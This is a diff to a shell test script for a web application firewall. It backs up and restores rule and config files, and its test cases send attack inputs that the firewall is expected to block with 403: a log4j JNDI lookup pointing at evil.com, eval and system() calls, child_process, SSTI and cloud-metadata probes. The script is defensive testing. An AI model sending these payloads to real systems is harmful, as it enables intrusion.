@@ -26,8 +26,11 @@ sleep 1
 cp $RULE_DIR/blackip.rule /tmp/blackip.rule.bak 2>/dev/null || true
 cp $RULE_DIR/whiteip.rule /tmp/whiteip.rule.bak 2>/dev/null || true
 cp $RULE_DIR/cdnip.rule /tmp/cdnip.rule.bak 2>/dev/null || true
+cp $RULE_DIR/config.json /tmp/config.json.full.bak 2>/dev/null || true
 
 echo "8.8.4.4" > $RULE_DIR/blackip.rule
+# 白名单测试夹具：临时写入 8.8.8.8（脚本末尾恢复备份）
+echo "8.8.8.8" > $RULE_DIR/whiteip.rule
 
 cat > $RULE_DIR/config.json << 'EOF'
 {"waf_enable":"on","trust_proxy_headers":"on","log_dir":"/tmp","white_url_check":"on","white_ip_check":"on","white_ua_check":"on","black_ip_check":"on","url_check":"on","url_args_check":"on","user_agent_check":"on","cookie_check":"on","cc_check":"off","cc_rate":"999999/60","cc_block_ttl":0,"post_check":"on","referer_check":"on","file_upload_check":"on","bodyless":"on","multipart_streaming_check":"off","upload_filename_scan_limit":0,"post_body_scan_limit":2097152,"waf_output":"html","waf_redirect_url":""}
@@ -160,7 +163,7 @@ test_rule "Args javascript:"       403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=
 test_rule "Args base64_decode"     403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=base64_decode(aGVsbG8=)"
 test_rule "Args log4j jndi"        403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=\${jndi:ldap://evil.com}"
 test_rule "Args eval()"            403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=eval(base64_decode(aGVsbG8=))"
-test_rule "Args system()"          403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=system(ls)"
+test_rule "Args system()"          403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=system(%22ls%22)"
 test_rule "Args reverse-shell"     403 -H "User-Agent: Mozilla/5.0" "$TARGET/?q=reverse-shell"
 test_rule "Args 169.254.169.254"  403 -H "User-Agent: Mozilla/5.0" "$TARGET/?url=169.254.169.254"
 # 同步 nginx 2026-09-17 规则收紧：CONCAT()/CHAR() 属高误报规则已移除，改为断言放行
@@ -208,7 +211,7 @@ test_rule "POST base64_decode"     403 -H "User-Agent: Mozilla/5.0" -d "x=base64
 test_rule "POST \$_GET"            403 -H "User-Agent: Mozilla/5.0" -d 'x=$_GET[cmd]' "$TARGET/"
 test_rule "POST \$_POST"           403 -H "User-Agent: Mozilla/5.0" -d 'y=$_POST[data]' "$TARGET/"
 test_rule "POST eval()"            403 -H "User-Agent: Mozilla/5.0" -d "x=eval(base64_decode(aGVsbG8=))" "$TARGET/"
-test_rule "POST system()"          403 -H "User-Agent: Mozilla/5.0" -d "x=system(ls)" "$TARGET/"
+test_rule "POST system()"          403 -H "User-Agent: Mozilla/5.0" -d 'x=system("ls")' "$TARGET/"
 test_rule "POST child_process"     403 -H "User-Agent: Mozilla/5.0" -d "x=require('child_process')" "$TARGET/"
 test_rule "POST SSTI"              403 -H "User-Agent: Mozilla/5.0" -d 'x={{__class__}}' "$TARGET/"
 test_rule "POST \$eq("             403 -H "User-Agent: Mozilla/5.0" -d 'x=$eq(1)' "$TARGET/"
@@ -461,9 +464,7 @@ fi
 cp /tmp/blackip.rule.bak $RULE_DIR/blackip.rule 2>/dev/null || true
 cp /tmp/whiteip.rule.bak $RULE_DIR/whiteip.rule 2>/dev/null || true
 cp /tmp/cdnip.rule.bak $RULE_DIR/cdnip.rule 2>/dev/null || true
-cat > $RULE_DIR/config.json << 'EOF'
-{"waf_enable":"on","trust_proxy_headers":"on","log_dir":"/var/log/caddyguard","url_check":"on","url_args_check":"on","post_check":"on","user_agent_check":"on","cookie_check":"on","cc_check":"on","cc_rate":"60/60","cc_block_ttl":600,"white_ip_check":"on","white_ua_check":"on","white_url_check":"on","black_ip_check":"on","referer_check":"off","file_upload_check":"on","bodyless":"on","multipart_streaming_check":"off","upload_filename_scan_limit":0,"post_body_scan_limit":2097152,"waf_output":"html","waf_redirect_url":"https://www.waf.com"}
-EOF
+cp /tmp/config.json.full.bak $RULE_DIR/config.json 2>/dev/null || true
 
 kill $(pgrep -x caddy) 2>/dev/null || true
 echo ""
